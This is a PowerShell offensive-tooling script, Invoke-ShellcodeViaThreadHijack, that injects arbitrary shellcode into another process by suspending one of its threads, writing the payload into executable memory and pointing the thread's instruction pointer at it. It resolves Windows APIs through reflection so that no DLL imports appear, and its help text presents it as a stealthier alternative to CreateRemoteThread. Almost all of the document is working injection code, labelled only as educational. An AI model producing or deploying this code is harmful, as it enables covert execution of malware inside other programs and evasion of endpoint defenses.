function Invoke-ShellcodeViaThreadHijack
{
<#
.SYNOPSIS
    Injects and executes shellcode in a hijacked thread of a remote process using SetThreadContext.

    This method demonstrates thread hijacking, where a thread in a remote process is suspended,
    its context modified to point to injected shellcode, and then resumed. The shellcode is
    written into RWX memory allocated via VirtualAllocEx.

    This is more stealthy than CreateRemoteThread, but is less detectable by advanced EDRs.
    Intended for educational and research use only.

    Notes:
        - I tested this POC on x64 Win11.
        - You can only create an x64 processes on an x64 host architecture.

.DESCRIPTION
    Author: Silentis Vox (@SilentisVox)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.PARAMETER TargetPID
    Process ID of the remote target process.

.PARAMETER TargetTID
    Thread ID of a thread within the target process.

.PARAMETER Shellcode
    A byte array containing the shellcode to be injected.

.EXAMPLE
    PS C:\> Invoke-ShellcodeViaThreadHijack -TargetPID 1234 -TargetTID 5678 -Shellcode $Shellcode -Verbose
    VERBOSE: [+] Opened Process Handle Of Target Process.
    VERBOSE: [+] Opened Process Handle Of Target Process.
    VERBOSE: [+] Target Thread suspended.
    VERBOSE: [+] Allocated Memory To 0x2317433765888.
    VERBOSE: [+] Shellcode [272] Written To 0x2317433765888.
    VERBOSE: [+] Retrieved Current Thread Execution Context.
    VERBOSE: [+] RIP Now Points To Remote Address 0x2317433765888.
    VERBOSE: [+] Thread Execution Context Set.
    VERBOSE: [+] Thread Has Been Resumed And May Now Execute.
    True
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [UInt32] $TargetPID,

        [Parameter(Mandatory)]
        [UInt32] $TargetTID,

        [Parameter(Mandatory)]
        [Byte[]] $Shellcode
    )

    function Get-Delegate
    {   
        # We can grab a function address easily, but to treat it as such has it's quirks.

        # Every function is tied to the name of it's method. The method must have a
        # brothering contructor, and a parenting type. The type must have a parenting
        # module. The module must have a parenting assembly.

        # So in reverse order, we create an assembly; under the assembly is a type,
        # so we create that; under the type is the constructor, and invocation method.
        # once that is built, we can then return it use ready.

        param(
            [Parameter(Mandatory)]
            [IntPtr]$FunctionAddress,

            [Parameter(Mandatory)]
            [Type[]]$ArgumentTypes,

            [Parameter()]
            [Type]$ReturnType=[Void]
        )

        # Create an in memory assembly where the delegate will reside.

        $AssemblyNameString             = "New Assembly"
        $AssemblyName                   = [Reflection.AssemblyName]::New($AssemblyNameString)
        $AssemblyBuilderAccess          = [Reflection.Emit.AssemblyBuilderAccess]::Run
        $Domain                         = [AppDomain]::CurrentDomain

        $AssemblyBuilder                = $Domain.DefineDynamicAssembly($AssemblyName, $AssemblyBuilderAccess)

        # Define the single module.

        $ModuleNameString               = "New Module"
        $EmitDebug                      = $false

        $ModuleBuilder                  = $AssemblyBuilder.DefineDynamicModule($ModuleNameString, $EmitDebug)

        # Define the single type.

        $TypeNameString                 = "New Type"
        $TypeAttributes                 = "Class, Public, Sealed, AnsiClass, AutoClass"
        $DelegateBaseType               = [MulticastDelegate]

        $TypeBuilder                    = $ModuleBuilder.DefineType($TypeNameString, $TypeAttributes, $DelegateBaseType)

        # Define the contructor needed.

        $ConstructorAttributes          = "RTSpecialName, HideBySig, Public"
        $ConstructorCallingConvention   = [Reflection.CallingConventions]::Standard
        $ImplementationFlags            = "Runtime, Managed"

        $ConstructorBuilder             = $TypeBuilder.DefineConstructor($ConstructorAttributes, $ConstructorCallingConvention, $ArgumentTypes)
        $ConstructorBuilder.SetImplementationFlags($ImplementationFlags)

        # Define the invocation method.

        $MethodNameString               = "Invoke"
        $MethodAttributes               = "Public, HideBySig, NewSlot, Virtual"

        $MethodBuilder                  = $TypeBuilder.DefineMethod($MethodNameString, $MethodAttributes, $ReturnType, $ArgumentTypes)
        $MethodBuilder.SetImplementationFlags($ImplementationFlags)

        # Create the delegate.

        $Delegate                       = $TypeBuilder.CreateType()
        $DelegateInstance               = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $Delegate)

        return $DelegateInstance
    }

    # System.dll contains all of our unconventional types.

    $Assemblies                         = [AppDomain]::CurrentDomain.GetAssemblies()
    $SystemAssembly                     = $null

    foreach ($Assembly in $Assemblies)
    {
        if ($Assembly.GlobalAssemblyCache -and $Assembly.Location.Split("\\")[-1] -eq "System.dll")
        {
            $SystemAssembly             = $Assembly
            break
        }
    }

    $UnsafeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods")
    $NativeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.NativeMethods")

    # Get the methods needed to grab functions within the dlls.

    $GetModuleHandle                    = $UnsafeMethodsType.GetMethod("GetModuleHandle")
    $GetProcAddress                     = $UnsafeMethodsType.GetMethod("GetProcAddress", [Reflection.BindingFlags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @([IntPtr], [String]), $null);
    
    # Get all of our address pointers to our needed functions.

    $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @([String] "kernel32.dll"))

    $OpenProcessAddress                 = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "OpenProcess"))
    $OpenThreadAddress                  = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "OpenThread"))
    $SuspendThreadAddress               = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "SuspendThread"))
    $VirtualAllocExAddress              = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "VirtualAllocEx"))
    $WriteProcessMemoryAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "WriteProcessMemory"))
    $GetThreadContextAddress            = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "GetThreadContext"))
    $SetThreadContextAddress            = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "SetThreadContext"))
    $ResumeThreadAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "ResumeThread"))

    # Create delegates with our function pointers.

    $OpenProcess                        = Get-Delegate $OpenProcessAddress @([UInt64], [Bool], [Int32]) ([IntPtr])
    $OpenThread                         = Get-Delegate $OpenThreadAddress @([UInt64], [Bool], [Int32]) ([IntPtr])
    $SuspendThread                      = Get-Delegate $SuspendThreadAddress @([IntPtr]) ([Int32])
    $VirtualAllocEx                     = Get-Delegate $VirtualAllocExAddress @([IntPtr], [IntPtr], [Int32], [Int32], [Int32]) ([IntPtr])
    $WriteProcessMemory                 = Get-Delegate $WriteProcessMemoryAddress @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr]) ([Bool])
    $GetThreadContext                   = Get-Delegate $GetThreadContextAddress @([IntPtr], [Byte[]]) ([Bool])
    $SetThreadContext                   = Get-Delegate $SetThreadContextAddress @([IntPtr], [Byte[]]) ([Bool])
    $ResumeThread                       = Get-Delegate $ResumeThreadAddress @([IntPtr]) ([Int32])

    # Initialize needed variables and structure.

    $ShellcodeSize                      = $Shellcode.Length

    $ContextSize                        = 1232
    $Context                            = [Byte[]]::New($ContextSize)
    
    $ContextFlags                       = 0x00010007
    $ContextFlagsBytes                  = [BitConverter]::GetBytes($ContextFlags)
    $ContextFlagsOffset                 = 48

    foreach ($Index in 0..$ContextFlagsBytes.Length)
    {
        $Context[$ContextFlagsOffset + $Index] = $ContextFlagsBytes[$Index]
    }

    $BytesWritten                       = [IntPtr]::Zero

    $PROCESS_ALL_ACCESS                 = 0x001F0FFF
    $THREAD_ALL_ACCESS                  = 0x001F03FF
    $MEM_COMMIT                         = 0x00001000
    $PAGE_EXECUTE_READWRITE             = 0x40

    # Open our target process.

    $DesiredAccess                      = $PROCESS_ALL_ACCESS
    $InheritHandle                      = $false
    
    $ProcessHandle                      = $OpenProcess.Invoke($DesiredAccess, $InheritHandle, $TargetPID)

    $INVALID_PROCESS_HANDLE             = 0xFFFFFFFF

    if (($ProcessHandle) -and ($ProcessHandle -ne $INVALID_PROCESS_HANDLE))
    {
        Write-Verbose "[+] Opened Process Handle Of Target Process."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] OpenProcess Failed: $FunctionError"
        $false
        return
    }

    # Open our target thread.

    $DesiredAccess                      = $THREAD_ALL_ACCESS
    $InheritHandle                      = $false

    $ThreadHandle                       = $OpenThread.Invoke($DesiredAccess, $InheritHandle, $TargetTID)

    $INVALID_THREAD_HANDLE              = 0xFFFFFFFF

    if (($ThreadHandle) -and ($ThreadHandle -ne $INVALID_THREAD_HANDLE))
    {
        Write-Verbose "[+] Opened Process Handle Of Target Process."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] OpenThread Failed: $FunctionError"
        $false
        return
    }

    # Suspend the thread.

    $Result                             = $SuspendThread.Invoke($ThreadHandle)

    if ($Result -ne -1)
    {
        Write-Verbose "[+] Target Thread suspended."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] SuspendThread Failed: $FunctionError"
        $false
        return
    }

    # Allocate memory within the target process.

    $AddressPointer                     = [IntPtr]::Zero
    $Protect                            = $MEM_COMMIT
    $AllocationType                     = $PAGE_EXECUTE_READWRITE

    $RemoteAddress                      = $VirtualAllocEx.Invoke($ProcessHandle, $AddressPointer, $ShellcodeSize, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

     if (($RemoteAddress) -and ($RemoteAddress -ne [IntPtr]::Zero))
    {
        Write-Verbose ("[+] Allocated Memory To 0x{0:X}." -f $RemoteAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] VirtualAllocEx Failed: $FunctionError"
        $false
        return
    }

    # Write shellcode to the memory.

    $Result                             = $WriteProcessMemory.Invoke($ProcessHandle, $RemoteAddress, $Shellcode, $ShellcodeSize, $BytesWritten)

    if ($Result)
    {
        Write-Verbose ("[+] Shellcode [$ShellcodeSize] Written To 0x{0:X}." -f $RemoteAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] WriteProcessMemory Failed: $FunctionError"
        $false
        return
    }

    # Query the thread's execution context.

    $Result                             = $GetThreadContext.Invoke($ThreadHandle, $Context)

    if ($Result)
    {
        Write-Verbose "[+] Retrieved Current Thread Execution Context."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] GetThreadContext Failed: $FunctionError"
        $false
        return
    }

    # Overwrite the Rip field pointing to our memory.

    $RipOffset                          = 248
    $RemoteAddressBytes                 = [BitConverter]::GetBytes($RemoteAddress.ToInt64())

    foreach ($Index in 0..$RemoteAddressBytes.Length)
    {
        $Context[$RipOffset + $Index]   = $RemoteAddressBytes[$Index]
    }

    Write-Verbose ("[+] RIP Now Points To Remote Address 0x{0:X}." -f $RemoteAddress.ToInt64())

    # Set the thread with it's updated execution context.

    $Result                             = $SetThreadContext.Invoke($ThreadHandle, $Context)

    if ($Result)
    {
        Write-Verbose "[+] Thread Execution Context Set."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] SetThreadContext Failed: $FunctionError"
        $false
        return
    }

    # Resume the thread.

    $Result                             = $ResumeThread.Invoke($ThreadHandle)

    if ($Result)
    {
        Write-Verbose "[+] Thread Has Been Resumed And May Now Execute."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] SetThreadContext Failed: $FunctionError"
        $false
        return
    }

    return $true
}
